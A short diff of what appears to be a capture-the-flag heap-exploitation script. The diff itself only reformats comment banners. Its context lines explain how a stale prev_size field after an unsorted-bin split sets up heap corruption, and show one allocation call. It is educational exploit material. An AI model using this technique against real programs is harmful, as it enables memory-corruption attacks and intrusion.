@@ -90,7 +90,9 @@ def pwn():
 	#	0x603210:	0x4444444444444444	0x4444444444444444
 	#			           ...
 	########################################################
-
+	
+	########################################################
+	#
 	# Further allocations will not update chunk y's prev_size properly. Why?
 	# Chunk x is now in the unsorted bin. Once we request an allocation of size <= 0x200
 	# malloc will unlink the unsorted chunk and then split it to give it back to the user 
@@ -136,6 +138,8 @@ def pwn():
 	# But, 0x6032f0 + 0xf0 = 0x6033e0, which is 0x10 bytes before the address of the prev_size field!
 	# So chunk y's prev_size field remains the same thinking the previous free chunk is at address
 	# (char *)chunk y - 0x210! Let's check it out in GDB.
+	#
+	########################################################
 
 	alloc(0x108,  'G'*0x108)
 
